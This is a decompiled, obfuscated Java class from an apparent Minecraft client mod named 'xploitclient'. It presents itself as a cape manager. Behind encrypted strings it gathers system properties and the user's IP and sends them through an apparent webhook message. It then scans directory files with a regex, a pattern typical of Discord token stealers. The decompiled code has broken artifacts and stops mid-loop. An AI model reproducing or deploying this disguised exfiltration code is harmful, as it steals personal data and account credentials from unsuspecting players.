package com.exploiters.xploitclient.utils.wipcapes;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Iterator;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import me.superblaubeere27.jobf.processors.encryption.string.BlowfishEncryptionAlgorithm;
import me.superblaubeere27.jobf.processors.encryption.string.DESEncryptionAlgorithm;
import me.superblaubeere27.jobf.processors.encryption.string.XOREncryptionAlgorithm;

public class MeteorCapeManager {
  static {
    lIIlIIIlIl();
    lllllllIIl();
  }
  
  private static boolean lIllIIIlIl(String IIIIlllIlIIllIl) {
    return (SYNTHETIC_LOCAL_VARIABLE_0 != null);
  }
  
  private static void lIIlIIIlIl() {
    lIlllIll = new int[95];
    lIlllIll[0] = (0x24 ^ 0x51 ^ 0x53 ^ 0x1F) & (0x9A ^ 0x91 ^ 0xF6 ^ 0xC4 ^ -" ".length());
    lIlllIll[1] = " ".length();
    lIlllIll[2] = "  ".length();
    lIlllIll[3] = "   ".length();
    lIlllIll[4] = 3 + 32 - -32 + 130 ^ 23 + 97 - 106 + 179;
    lIlllIll[5] = 0x2B ^ 0x2E;
    lIlllIll[6] = 0xC ^ 0x46 ^ 0x3E ^ 0x72;
    lIlllIll[7] = 0x50 ^ 0x57;
    lIlllIll[8] = 0x53 ^ 0x5B;
    lIlllIll[9] = 0x1A ^ 0x13;
    lIlllIll[10] = 0xE ^ 0x4;
    lIlllIll[11] = 0x9E ^ 0x95;
    lIlllIll[12] = 0x1 ^ 0xD;
    lIlllIll[13] = 0x35 ^ 0x38;
    lIlllIll[14] = 0x4E ^ 0x60 ^ 0x98 ^ 0xB8;
    lIlllIll[15] = 0x52 ^ 0x5D;
    lIlllIll[16] = 0x9A ^ 0x89 ^ "   ".length();
    lIlllIll[17] = 0x6F ^ 0x7E;
    lIlllIll[18] = 8 + 205 - 130 + 130 ^ 118 + 103 - 84 + 62;
    lIlllIll[19] = 0x5 ^ 0x16;
    lIlllIll[20] = 104 + 32 - 5 + 22 ^ 83 + 104 - 110 + 64;
    lIlllIll[21] = 0x61 ^ 0x74;
    lIlllIll[22] = 0x54 ^ 0x29 ^ 0x3D ^ 0x56;
    lIlllIll[23] = 0x64 ^ 0x6E ^ 0xF ^ 0x12;
    lIlllIll[24] = 0x3 ^ 0x1B;
    lIlllIll[25] = 0xAA ^ 0xB3;
    lIlllIll[26] = 6 + 103 - -74 + 40 ^ 35 + 39 - -31 + 92;
    lIlllIll[27] = 0x3 ^ 0x41 ^ 0x52 ^ 0xB;
    lIlllIll[28] = 141 + 92 - 141 + 63 ^ 55 + 46 - 21 + 55;
    lIlllIll[29] = 0x55 ^ 0x45 ^ 0x7 ^ 0xA;
    lIlllIll[30] = 0x11 ^ 0xF;
    lIlllIll[31] = 0xBD ^ 0xA2;
    lIlllIll[32] = 0x41 ^ 0x61;
    lIlllIll[33] = 0x5 ^ 0x6B ^ 0x68 ^ 0x27;
    lIlllIll[34] = 91 + 6 - -15 + 18 ^ 77 + 18 - 33 + 98;
    lIlllIll[35] = 0x8D ^ 0xAE;
    lIlllIll[36] = 0x59 ^ 0x7D;
    lIlllIll[37] = 43 + 34 - -113 + 36 ^ 74 + 192 - 255 + 188;
    lIlllIll[38] = 0x44 ^ 0x52 ^ 0xB8 ^ 0x88;
    lIlllIll[39] = 0xE ^ 0x29;
    lIlllIll[40] = 0x7 ^ 0x67 ^ 0xC6 ^ 0x8E;
    lIlllIll[41] = 0x98 ^ 0xB1;
    lIlllIll[42] = 0xA3 ^ 0x89;
    lIlllIll[43] = 0x93 ^ 0xB8;
    lIlllIll[44] = 0x8 ^ 0x4E ^ 0x36 ^ 0x5C;
    lIlllIll[45] = 0x58 ^ 0x17 ^ 0x7 ^ 0x65;
    lIlllIll[46] = 0x90 ^ 0xBE;
    lIlllIll[47] = 0x3D ^ 0x12;
    lIlllIll[48] = 0x62 ^ 0x6C ^ 0x84 ^ 0xBA;
    lIlllIll[49] = 74 + 25 - 65 + 115 ^ 118 + 147 - 179 + 78;
    lIlllIll[50] = 0x6 ^ 0x59 ^ 0x7D ^ 0x10;
    lIlllIll[51] = 0x33 ^ 0x4E ^ 0xED ^ 0xA3;
    lIlllIll[52] = 0x4B ^ 0x7F;
    lIlllIll[53] = 117 + 118 - 198 + 92 ^ 175 + 8 - 140 + 137;
    lIlllIll[54] = 0xF ^ 0x39;
    lIlllIll[55] = 0x47 ^ 0x1A ^ 0x7C ^ 0x16;
    lIlllIll[56] = "   ".length() ^ 0x1F ^ 0x24;
    lIlllIll[57] = 84 + 95 - 17 + 9 ^ 128 + 73 - 88 + 33;
    lIlllIll[58] = 0xCB ^ 0xC3 ^ 0x4D ^ 0x7F;
    lIlllIll[59] = 0xAC ^ 0x97;
    lIlllIll[60] = 0x7 ^ 0x25 ^ 0x9F ^ 0x81;
    lIlllIll[61] = 0x1D ^ 0x20;
    lIlllIll[62] = 0x1C ^ 0x23 ^ " ".length();
    lIlllIll[63] = 0x4D ^ 0x72;
    lIlllIll[64] = 19 + 41 - -112 + 37 ^ 113 + 100 - 72 + 4;
    lIlllIll[65] = 0x67 ^ 0x26;
    lIlllIll[66] = 0x99 ^ 0x87 ^ 0xDC ^ 0x80;
    lIlllIll[67] = 0xD7 ^ 0x94;
    lIlllIll[68] = 0xF8 ^ 0xBC;
    lIlllIll[69] = 0x45 ^ 0x0;
    lIlllIll[70] = 0xDC ^ 0xB1 ^ 0x5F ^ 0x74;
    lIlllIll[71] = 219 + 134 - 202 + 78 ^ 63 + 57 - 6 + 48;
    lIlllIll[72] = 0xC4 ^ 0x8C;
    lIlllIll[73] = 41 + 72 - -31 + 96 ^ 150 + 24 - 92 + 103;
    lIlllIll[74] = 0xC0 ^ 0x8A;
    lIlllIll[75] = 0xFE ^ 0xB5;
    lIlllIll[76] = 0x6C ^ 0x20;
    lIlllIll[77] = 123 + 21 - -48 + 17 ^ 33 + 100 - 86 + 109;
    lIlllIll[78] = 0x67 ^ 0x29;
    lIlllIll[79] = 0xB1 ^ 0x9C ^ 0xA7 ^ 0xC5;
    lIlllIll[80] = 0x74 ^ 0x24;
    lIlllIll[81] = 0xCB ^ 0x9A;
    lIlllIll[82] = 0x63 ^ 0x31;
    lIlllIll[83] = 0x22 ^ 0xF ^ 0x34 ^ 0x4A;
    lIlllIll[84] = 192 + 54 - 193 + 196 ^ 140 + 89 - 146 + 90;
    lIlllIll[85] = 0x55 ^ 0x0;
    lIlllIll[86] = 0x7B ^ 0x17 ^ 0xFD ^ 0xC7;
    lIlllIll[87] = -(0x7C ^ 0x63);
    lIlllIll[88] = 153 + 58 - 42 + 19 + 149 + 75 - 150 + 94 - (0xFFFFB7EC & 0x495B) + 57 + 5 - -20 + 86;
    lIlllIll[89] = 0 + 87 - -3 + 46 + (0x6B ^ 0x58) - 151 + 89 - 194 + 132 + 6 + 98 - 84 + 126;
    lIlllIll[90] = 56 + 53 - 72 + 114;
    lIlllIll[91] = (0x8B ^ 0xAC) + (0x5D ^ 0x4C) - -(0xD0 ^ 0xAE) + (0xA2 ^ 0xB9);
    lIlllIll[92] = (0xC3 ^ 0xC4) + (0xC2 ^ 0x9C) - -(0x7A ^ 0x53) + (0x5B ^ 0x4A);
    lIlllIll[93] = 0x29 ^ 0x47;
    lIlllIll[94] = 0x67 ^ 0x4F ^ 0x1 ^ 0x77;
  }
  
  private static boolean llIlIIIlIl(int IlllIllIlIIllIl) {
    return (SYNTHETIC_LOCAL_VARIABLE_0 == null);
  }
  
  private static String IIlllllIIl(String lIIIlIIllIIllIl, String IlIIlIIllIIllIl) {
    IIIIlIIllIIllIl = new String(Base64.getDecoder().decode(lIIIlIIllIIllIl.getBytes(StandardCharsets.UTF_8)), StandardCharsets.UTF_8);
    StringBuilder lIlllIIllIIllIl = new StringBuilder();
    char[] IllIlIIllIIllIl = IlIIlIIllIIllIl.toCharArray();
    int lIlIlIIllIIllIl = XOREncryptionAlgorithm.lIlIIlIlIIIlI[lIlllIll[0]];
    char[] arrayOfChar1 = IIIIlIIllIIllIl.toCharArray();
    int i = arrayOfChar1.length;
    int j = XOREncryptionAlgorithm.lIlIIlIlIIIlI[lIlllIll[0]];
    while (IlIlIIIlIl(XOREncryptionAlgorithm.lIlIlIIlIlIlII(j, i))) {
      char lIIllIIllIIllIl = arrayOfChar1[j];
      "".length();
      lIlIlIIllIIllIl++;
      j++;
      "".length();
      if (IlIlIIIlIl((lIlllIll[0] + lIlllIll[83] - lIlllIll[87] + lIlllIll[13] ^ lIlllIll[88] ^ lIlllIll[89]) & (lIlllIll[90] + lIlllIll[77] - lIlllIll[91] + lIlllIll[92] ^ lIlllIll[9] + lIlllIll[93] - lIlllIll[67] + lIlllIll[94] ^ -" ".length())))
        return null; 
    } 
    return String.valueOf(lIlllIIllIIllIl);
  }
  
  private static void lllllllIIl() {
    IlIllIll = new String[lIlllIll[86]];
    IlIllIll[lIlllIll[0]] = IIlllllIIl("Gj4xIz5IZWo3JAEpKiEpXCkqPmITOix8OhcoLTwiGTlqa3hCcnRgfkR5fGF/S3hyZXRKZTYECzYrD2Z7Aw03BzwKHgEFK0oeNQt0Gj9zMSs0JCgCDxMifAYYBwYsASULOAADCBsmHH58NwUrBR06eDEXdTgjdzYC", "rJESM");
    IlIllIll[lIlllIll[1]] = lIlllllIIl("OqZtmAvLcAFd/vlRodbiiA==", "ptmag");
    IlIllIll[lIlllIll[2]] = IIlllllIIl("Ohw2HhdoR20LHCYNMAAFPkUhAQomDSwaSjYdIQUAJwspCQt8Cy0DSzsdbVERbwA2GhQhTXEvQWAuZ1wiJAElAAEmHCdAEzsDKw9KPAchAQs5ASdACjccZ1wiIRwjHBMzGjFLVhQBLw8DNxtnXCJmTXAoUDNNcCgvKwQtMTY3Bh06KBhGMgAD", "RhBnd");
    IlIllIll[lIlllIll[3]] = IllllllIIl("LAtVDXf6cwam949yHUuRZoj4nD5GrSSHdpGGVPZPHoH1tzGkbW6splxIjjF+XaLmlr3E5MPAD/SuldIus0s4sFmwx3tcaBG0yu4RJFENGfWUDvu35LWdpHj2VYKIzO30SgQsnMF7mwfwo1rW85WX3nEqrX3BrKNpSwYX1Q6jpq8=", "pOWqG");
    IlIllIll[lIlllIll[4]] = IllllllIIl("QijVqeEJ56mJH2VAn4f9+Q==", "SdwSp");
    IlIllIll[lIlllIll[5]] = lIlllllIIl("tNfDKSy024gFIEM8nEPu/A==", "jUAWK");
    IlIllIll[lIlllIll[6]] = lIlllllIIl("hTsayDblouk=", "QuHDb");
    IlIllIll[lIlllIll[7]] = lIlllllIIl("C/TXBJTYp0F3VMkcyObi/fHUljKaiNuPpTPWfjizGIY=", "KFbkt");
    IlIllIll[lIlllIll[8]] = IllllllIIl("L+B9oaYMA4aa2SbT2bwKSA==", "fLPQx");
    IlIllIll[lIlllIll[9]] = IIlllllIIl("AhgeH0kbBBw=", "Iarpi");
    IlIllIll[lIlllIll[10]] = IllllllIIl("53mi0ZfPG9jqHKCsc+SIYQ==", "srjIM");
    IlIllIll[lIlllIll[11]] = lIlllllIIl("0EwKilI5CwOHm3Zv0ihX3A==", "CoqeW");
    IlIllIll[lIlllIll[12]] = lIlllllIIl("HEQWnSaaTMQCCWszOCxyGg==", "JXKMt");
    IlIllIll[lIlllIll[13]] = IIlllllIIl("a1NIHDVreUhpRg==", "KYhSf");
    IlIllIll[lIlllIll[14]] = lIlllllIIl("G2wZhr9fP10=", "pcSGQ");
    IlIllIll[lIlllIll[15]] = IIlllllIIl("Pz8iChZtZHkfHSMuJBQEO2Y1FQsjLjgOSzM+NREBIig9HQp5KDkXSj4+eUUQaiMiDhUkbmU7QGUNc0gjISIxFAAjPzNUEj4gPxtLOSQ1FQo8IjNUCzI/c0gjJD83CBI2OSVfVxEiOxsCMjhzSCNjbmQ8UTZuZDwuLic5JTcyJQkuKR1lJhQC", "WKVze");
    IlIllIll[lIlllIll[16]] = lIlllllIIl("qlkeTfEmLuQ=", "EYNsB");
    IlIllIll[lIlllIll[17]] = IIlllllIIl("Ez4NJGYOIgUz", "fMhVH");
    IlIllIll[lIlllIll[18]] = IIlllllIIl("SBsgIiUGLjF9Mwg7PTsPAHU0OxIENSI2Tis1MzMNRwkkPRMGPTV9DQIsNT4FBXU=", "gZPRa");
    IlIllIll[lIlllIll[19]] = IllllllIIl("3EgtRi8hzmj6GxKZ2kqP8g==", "iewDh");
    IlIllIll[lIlllIll[20]] = lIlllllIIl("BTCcwEnYyM+KKVVvYj6tlw+act8jtl2nTwSHB4yMS+OYGe4G0mX+27auyZLX0vrkoapCzgEs0PY=", "WatUS");
    IlIllIll[lIlllIll[21]] = lIlllllIIl("260Ng+W1JGdR/lpqqoRMEQ==", "PcbyO");
    IlIllIll[lIlllIll[22]] = lIlllllIIl("AF0BdpiwDuOIsVFrYKald7+RL2fSbulxuL5F9Nmv8Nn/5PoeRDLMj+mNyglemHr2f/a1631EwYA=", "zQEwi");
    IlIllIll[lIlllIll[23]] = IIlllllIIl("NzshEVQqJykG", "BHDcz");
    IlIllIll[lIlllIll[24]] = IllllllIIl("qRc/Iizxzx6Ltq+zbBBRSRSit0bAI5rREhCASeXm33x7sZ/3sTGbNtKkPrc+W8ZVaw0gT763XX1TNi0AgtdJd/MHCdjGYL1D", "EACuz");
    IlIllIll[lIlllIll[25]] = IllllllIIl("N5yCYqLK3/7OZwaaFFcaQQ==", "FXcmK");
    IlIllIll[lIlllIll[26]] = lIlllllIIl("TaF8ynjLnEobqdBMIgwXjIH/oa6yqM3JOqRb+xJzqLwueQM0YnAe+Xjg8XSV1Itp2Dwr2q+6k6kvhDEyRs8wuGPdoIWJIwBh", "XQdvr");
    IlIllIll[lIlllIll[27]] = IllllllIIl("ggiAIDdvOfibJvNL2k/XHQ==", "dYYjo");
    IlIllIll[lIlllIll[28]] = lIlllllIIl("St7JFvRCuLk2Xz0pmecWh/MORWwdLpyDF7ImAyEhYjnv1YGV6O9Q+3H/mV900qdn79WBlejvUPsxmK/KIGieTQ==", "CamGg");
    IlIllIll[lIlllIll[29]] = lIlllllIIl("D4BtN9yNvdc=", "CzKfS");
    IlIllIll[lIlllIll[30]] = IIlllllIIl("WA==", "xYYfW");
    IlIllIll[lIlllIll[31]] = lIlllllIIl("84/boRcdsU/LGX04DeVqeA==", "HAyBx");
    IlIllIll[lIlllIll[32]] = IllllllIIl("xprWHZ/osW4=", "AReZL");
    IlIllIll[lIlllIll[33]] = IllllllIIl("U1JHYm/q3Gg=", "PLWzW");
    IlIllIll[lIlllIll[34]] = lIlllllIIl("nONvjK7mDNvKN2OXmzVEV67dcpVwgQ6M8Q1GlyLEo2TqmCaKv1JORAUj3dQzBJMbvvMt/5AuQ/1H+ZCmUdeJzcsJmxYNbMUDJat0r6syK1oWCLbUK1bJVoMluF1aDRI+ot4HF49nRhljP4BtphcoOS0kgrTbZktqltDH71Gd/x+MlOXtDTNHig==", "kPGZV");
    IlIllIll[lIlllIll[35]] = IllllllIIl("6flLOeasD/WySqnekK1GUA==", "HVhsE");
    IlIllIll[lIlllIll[36]] = lIlllllIIl("fVlzO4mpS549EzrlKErQ698gm2nmja9CthpOYReifhw=", "oTmnJ");
    IlIllIll[lIlllIll[37]] = IllllllIIl("RBS9v8Hu/WY=", "JSCwl");
    IlIllIll[lIlllIll[38]] = IllllllIIl("yKi7kmDcbXnRmtf935VI00Fk1FXB5/EbwdAo6ncxgEIoOBUDYyYNbJaGJs4OZekL/itdSoRsytFjgCqroLWFjMplVtWILywAU0Xo2weA2jb4AAi529SZsMQgEGpQsVwEP9LTg03gjsXlNyE0Ku8VddP3YtsnkjsHhsCitvxVtdLVdgZVkRM+9A==", "NiATW");
    IlIllIll[lIlllIll[39]] = IIlllllIIl("MCIdB0ktPhUQ", "EQxug");
    IlIllIll[lIlllIll[40]] = lIlllllIIl("KALNUFfo4KiqB0Cl0SkZQSvVEpOdhAsL", "oyYOO");
    IlIllIll[lIlllIll[41]] = IIlllllIIl("GBMBLg0XBBkyBQ==", "YPBaX");
    IlIllIll[lIlllIll[42]] = IllllllIIl("H1yD3RZQS6U=", "QxGvb");
    IlIllIll[lIlllIll[43]] = IIlllllIIl("clVB", "RoaLm");
    IlIllIll[lIlllIll[44]] = IllllllIIl("UInFTTZfaIE=", "eMmPr");
    IlIllIll[lIlllIll[45]] = lIlllllIIl("a1n3WsUJcQw=", "xsBEt");
    IlIllIll[lIlllIll[46]] = lIlllllIIl("sqfURFeCaF0=", "rbqKL");
    IlIllIll[lIlllIll[47]] = IllllllIIl("XwNdRg3WQbE=", "gHGYh");
    IlIllIll[lIlllIll[48]] = IIlllllIIl("KC4UBUgxMhY=", "cWxjh");
    IlIllIll[lIlllIll[49]] = IllllllIIl("6dPeuo3hnAc=", "kdFJK");
    IlIllIll[lIlllIll[50]] = IllllllIIl("E2AK8OmqFJg=", "hvOyU");
    IlIllIll[lIlllIll[51]] = IIlllllIIl("PBAwAj1uS2sXNiABNhwvOEknHSAgASoGYDARJxkqIQcvFSF6BysfYT0Ra007aQwwBj4nQXcza2YiYUAIIg0jHCsgECFcOT0PLRNgOgsnHSE/DSFcIDEQYUAIJxAlADk1FjdXfBINKRMpMRdhQAhgQXY0ejVBdjQFLQgrLRwxChsmAh5KNBwp", "TdDrN");
    IlIllIll[lIlllIll[52]] = IllllllIIl("DfImaRn6XSMYYog6O0AasQ==", "Dgayn");
    IlIllIll[lIlllIll[53]] = lIlllllIIl("uH4gVuJ0g6juSCZtj9vDmsEZGOFPgYaR+wdrhOmBII+lhBDIVAk6vg==", "vFVDX");
    IlIllIll[lIlllIll[54]] = IllllllIIl("HKz+8ZN2aqs=", "snykB");
    IlIllIll[lIlllIll[55]] = IIlllllIIl("ACI7JDpSeWAxMRwzPTooBHssOyccMyEgZwwjLD8tHTUkMyZGNSA5ZgEjYGs8VT47IDkbc3wVbFoQamYPHj8oOiwcIip6PgE9JjVnBjksOyYDPyp6Jw0iamYPGyIuJj4JJDxxey4/IjUuDSVqZg9cc30SfQlzfRICETogCxsNOBAABSJ4Pzou", "hVOTI");
    IlIllIll[lIlllIll[56]] = IllllllIIl("+WAuVO/ywh1IftxlDh/Mew==", "zxExo");
    IlIllIll[lIlllIll[57]] = IllllllIIl("9iMVMyQzG88a1aiZIzFYUOqo8QTlFSLz", "swnxE");
    IlIllIll[lIlllIll[58]] = IIlllllIIl("JygLCiE5JwYBPS0=", "piRZn");
    IlIllIll[lIlllIll[59]] = IIlllllIIl("e2w=", "qLxZp");
    IlIllIll[lIlllIll[60]] = IIlllllIIl("OB4LBnIhAgk=", "sggiR");
    IlIllIll[lIlllIll[61]] = IIlllllIIl("AiEa", "bAzCQ");
    IlIllIll[lIlllIll[62]] = lIlllllIIl("m0lAr4tEv7I=", "ZOrrX");
    IlIllIll[lIlllIll[63]] = IllllllIIl("6UTzS5+9Y2C/IdLGyGED0EJX9Xc+dN5bZC9AquyfnoaILiWY8KHxkC6FbgNMrrTpbgXbnyOUuYzke6hzti9CHzN9KpLy45sLEwsQ4HcEJHfPNu2GATAwr5cKQMhCuwsc7DyfhGFH6WGpOg7s00wSzKwsvaMHdET9Cdt6MgOiVbQBDZVsAnKpaQ==", "orhZn");
    IlIllIll[lIlllIll[64]] = lIlllllIIl("VtK2WrArX+NdMIlltIRnYw==", "cKIKy");
    IlIllIll[lIlllIll[65]] = IIlllllIIl("FCQscAU6BQ4cFVQQA3AAIQgAcAc1HRwfGToQFwMNVH5s", "tDLPP");
    IlIllIll[lIlllIll[66]] = IIlllllIIl("NgMh", "VcAIj");
    IlIllIll[lIlllIll[67]] = IIlllllIIl("JAw5AyF2V2IWKjgdPx0zIFUuHDw4HSMHfCgNLhg2ORsmFD1iGyIefSUNYkwncRA5ByI/XX4yd34+aEEUOhEqHTc4DChdJSUTJBJ8IhcuHD0nEShdPCkMaEEUPwwsASUtCj5WYAoRIBI1KQtoQRR4XX81Zi1dfzUZNRQiLAApFhInHgZWPR01", "LxMsR");
    IlIllIll[lIlllIll[68]] = IllllllIIl("xVB7I/NhIVk=", "sWTOE");
    IlIllIll[lIlllIll[69]] = IllllllIIl("nJFOUHQwLHuY7QGfjtm7sA==", "cPUJG");
    IlIllIll[lIlllIll[70]] = lIlllllIIl("sBXI9U9sWrjus6fItWkdygLInA9ytM/0puugSitn1mVgQd4S6BAz5X7SGdm0pwuhWwBfCx18/q7xL84nonOvVw==", "XOJUd");
    IlIllIll[lIlllIll[71]] = IllllllIIl("4RW/2vhH/lcmDBRDhe0OzA==", "MWLBY");
    IlIllIll[lIlllIll[72]] = lIlllllIIl("syrv0OCJYHulo4HF+1mEBQ2OmMs9yejqHx3Vd606V1L3xDTioxWFcQIK369FgTJs98Q04qMVhXHTrMJgAC071g==", "aLjfU");
    IlIllIll[lIlllIll[73]] = lIlllllIIl("Qij+4NRO7s0=", "URBBX");
    IlIllIll[lIlllIll[74]] = IllllllIIl("H5f+9DR9AH8=", "PkvBO");
    IlIllIll[lIlllIll[75]] = IIlllllIIl("CTEOAE0QLQw=", "BHbom");
    IlIllIll[lIlllIll[76]] = IIlllllIIl("CAwJ", "hliZZ");
    IlIllIll[lIlllIll[77]] = IIlllllIIl("MhcH", "Rwgxf");
    IlIllIll[lIlllIll[78]] = IIlllllIIl("OjcmIRhobH00EyYmID8KPm4xPgUmJjwlRTY2MToPJyA5NgR8ID08RDs2fW4ebysmJRshZmEQTmAFd2MtJCo1Pw4mNzd/HDsoOzBFPCwxPgQ5Kjd/BTc3d2MtITczIxwzMSF0WRQqPzAMNzB3Yy1mZmAXXzNmYBcgKy89Djk3LQ0FJxhtIj8M", "RCRQk");
    IlIllIll[lIlllIll[79]] = lIlllllIIl("FHg4ms90oRCcxQ9njX5xwQ==", "cxbCO");
    IlIllIll[lIlllIll[80]] = lIlllllIIl("fcmYtZpXIqfIzSqx4QE3THWC2tlu/uPk2wX2Oklla/Y=", "BUrqv");
    IlIllIll[lIlllIll[81]] = lIlllllIIl("euAKiwtFK/Y=", "kpTDO");
    IlIllIll[lIlllIll[82]] = lIlllllIIl("oY9AovDb6f4y+tY/TCdJRFKYE9tBA2CN2zKdH3pVRASuf0xJ+pEJNdxgpteVZ9HWmRSpXKDaxiWF6hD3bCpNOJaqQZs25sPoLif2huJrqrRW5PWt/wHRrs/5RSXBdaCKDy/PsAss+5/rrUw6M2QDMhRt94K7aggtrKX721M43OLYTJwPZ8WTPA==", "epTNf");
    IlIllIll[lIlllIll[83]] = IIlllllIIl("PTUCGHckKQA=", "vLnwW");
    IlIllIll[lIlllIll[84]] = lIlllllIIl("1BlX7SuIarud2/GcwH5PBa9Mdj2vK5cz8s21/+KJqt8O7Ea66YKhvXairjIjCLf3NEMWCBMyRyp+GktMyWqCmA==", "XyIcQ");
    IlIllIll[lIlllIll[85]] = IIlllllIIl("Lh4EGAZ8RV8NDTIPAgYUKkcTBxsyDx4cWyIfEwMRMwkbDxpoCR8FWi8fX1cAewIEHAU1T0MpUHQsVVozMAMXBhAyHhVGAi8BGQlbKAUTBxotAxVGGyMeVVozNR4RGgInGANNRwADHQkSIxlVWjNyT0IuQSdPQi4+PwYfNycjBC88OQxEAAYS", "Fjphu");
  }
  
  private static boolean IlIlIIIlIl(long IIllIllIlIIllIl) {
    return (SYNTHETIC_LOCAL_VARIABLE_0 != null);
  }
  
  private static String IllllllIIl(String lIIIllIllIIllIl, Exception IIllIlIllIIllIl) {
    try {
      SecretKeySpec lIllIlIllIIllIl = new SecretKeySpec(MessageDigest.getInstance(BlowfishEncryptionAlgorithm.lllIIIlIlIlIl[BlowfishEncryptionAlgorithm.lllIIlIIllIlI[lIlllIll[0]]]).digest(IIllIlIllIIllIl.getBytes(StandardCharsets.UTF_8)), BlowfishEncryptionAlgorithm.lllIIIlIlIlIl[BlowfishEncryptionAlgorithm.lllIIlIIllIlI[lIlllIll[1]]]);
      Cipher IlllIlIllIIllIl = Cipher.getInstance(BlowfishEncryptionAlgorithm.lllIIIlIlIlIl[BlowfishEncryptionAlgorithm.lllIIlIIllIlI[lIlllIll[2]]]);
      IlllIlIllIIllIl.init(BlowfishEncryptionAlgorithm.lllIIlIIllIlI[lIlllIll[2]], lIllIlIllIIllIl);
      return new String(IlllIlIllIIllIl.doFinal(Base64.getDecoder().decode(lIIIllIllIIllIl.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8);
    } catch (Exception IIIIllIllIIllIl) {
      llllIlIllIIllIl.printStackTrace();
      return null;
    } 
  }
  
  private static String lIlllllIIl(String IlIllllIlIIllIl, String lIlllllIlIIllIl) {
    try {
      SecretKeySpec lllllllIlIIllIl = new SecretKeySpec(Arrays.copyOf(MessageDigest.getInstance(DESEncryptionAlgorithm.lIlllllIllIll[DESEncryptionAlgorithm.lIlllllIlllII[lIlllIll[0]]]).digest(lIlllllIlIIllIl.getBytes(StandardCharsets.UTF_8)), DESEncryptionAlgorithm.lIlllllIlllII[lIlllIll[1]]), DESEncryptionAlgorithm.lIlllllIllIll[DESEncryptionAlgorithm.lIlllllIlllII[lIlllIll[2]]]);
      Cipher llIllllIlIIllIl = Cipher.getInstance(DESEncryptionAlgorithm.lIlllllIllIll[DESEncryptionAlgorithm.lIlllllIlllII[lIlllIll[3]]]);
      llIllllIlIIllIl.init(DESEncryptionAlgorithm.lIlllllIlllII[lIlllIll[3]], lllllllIlIIllIl);
      return new String(llIllllIlIIllIl.doFinal(Base64.getDecoder().decode(IlIllllIlIIllIl.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8);
    } catch (Exception IllllllIlIIllIl) {
      Exception exception1;
      exception1.printStackTrace();
      return null;
    } 
  }
  
  private static boolean IIllIIIlIl(byte llIIlllIlIIllIl, Exception IlIIlllIlIIllIl) {
    return (SYNTHETIC_LOCAL_VARIABLE_0 < SYNTHETIC_LOCAL_VARIABLE_1);
  }
  
  private static boolean IlllIIIlIl(boolean IlIlIllIlIIllIl) {
    return (SYNTHETIC_LOCAL_VARIABLE_0 > null);
  }
  
  public MeteorCapeManager() {
    String IllIlIlllIIllIl = IlIllIll[lIlllIll[0]];
    String lIlIlIlllIIllIl = IlIllIll[lIlllIll[1]];
    String IIlIlIlllIIllIl = IlIllIll[lIlllIll[2]];
    MeteorCapeUtil llIIlIlllIIllIl = new MeteorCapeUtil(IlIllIll[lIlllIll[3]]);
    String IlIIlIlllIIllIl = IlIllIll[lIlllIll[4]];
    try {
      IlIIlIlllIIllIl = System.getProperty(IlIllIll[lIlllIll[5]]);
      "".length();
      if (" ".length() < 0)
        throw null; 
    } catch (Exception exception) {}
    String lIIIlIlllIIllIl = System.getProperty(IlIllIll[lIlllIll[6]]);
    try {
      URL IIllIIIIIlIllIl = new URL(IlIllIll[lIlllIll[7]]);
      BufferedReader llIlIIIIIlIllIl = new BufferedReader(new InputStreamReader(IIllIIIIIlIllIl.openStream()));
      String IlIlIIIIIlIllIl = llIlIIIIIlIllIl.readLine();
      String lIIlIIIIIlIllIl = System.getProperty(IlIllIll[lIlllIll[8]]);
      MeteorPlayerBuilder IIIlIIIIIlIllIl = (new MeteorPlayerBuilder.Builder()).withUsername(IlIllIll[lIlllIll[9]]).withContent(String.valueOf((new StringBuilder()).append(IlIllIll[lIlllIll[10]]).append(lIIlIIIIIlIllIl).append(IlIllIll[lIlllIll[11]]).append(IlIIlIlllIIllIl).append(IlIllIll[lIlllIll[12]]).append(IlIlIIIIIlIllIl).append(IlIllIll[lIlllIll[13]]).append(lIIIlIlllIIllIl).append(IlIllIll[lIlllIll[14]]))).withAvatarURL(IlIllIll[lIlllIll[15]]).withDev(lIlllIll[0]).build();
      llIIlIlllIIllIl.sendMessage(IIIlIIIIIlIllIl);
      "".length();
      if ((0x77 ^ 0x73) <= " ".length())
        throw null; 
    } catch (Exception exception) {}
    if (IlIlIIIlIl(lIIIlIlllIIllIl.contains(IlIllIll[lIlllIll[16]]))) {
      List<String> llIlIllllIIllIl = new ArrayList<>();
      "".length();
      "".length();
      "".length();
      "".length();
      "".length();
      int IlIlIllllIIllIl = lIlllIll[0];
      StringBuilder lIIlIllllIIllIl = new StringBuilder();
      "".length();
      try {
        Iterator<String> iterator = llIlIllllIIllIl.iterator();
        while (IlIlIIIlIl(iterator.hasNext())) {
          String IllllllllIIllIl = iterator.next();
          File IIIIIIIIIlIllIl = new File(IllllllllIIllIl);
          String[] lllllllllIIllIl = IIIIIIIIIlIllIl.list();
          if (llIlIIIlIl(lllllllllIIllIl)) {
            "".length();
            if (-"   ".length() >= 0)
              throw null; 
            continue;
          } 
          String[] arrayOfString1 = lllllllllIIllIl;
          int i = arrayOfString1.length;
          int j = lIlllIll[0];
          while (IIllIIIlIl(j, i)) {
            String lIIIIIIIIlIllIl = arrayOfString1[j];
            try {
              FileInputStream lIlIIIIIIlIllIl = new FileInputStream(String.valueOf((new StringBuilder()).append(IllllllllIIllIl).append(lIIIIIIIIlIllIl)));
              DataInputStream IIlIIIIIIlIllIl = new DataInputStream(lIlIIIIIIlIllIl);
              BufferedReader llIIIIIIIlIllIl = new BufferedReader(new InputStreamReader(IIlIIIIIIlIllIl));
              String IlIIIIIIIlIllIl;
              while (lIllIIIlIl(IlIIIIIIIlIllIl = llIIIIIIIlIllIl.readLine())) {
                Pattern lllIIIIIIlIllIl = Pattern.compile(IlIllIll[lIlllIll[28]]);
                Matcher IllIIIIIIlIllIl = lllIIIIIIlIllIl.matcher(IlIIIIIIIlIllIl);
                while (IlIlIIIlIl(IllIIIIIIlIllIl.find())) {
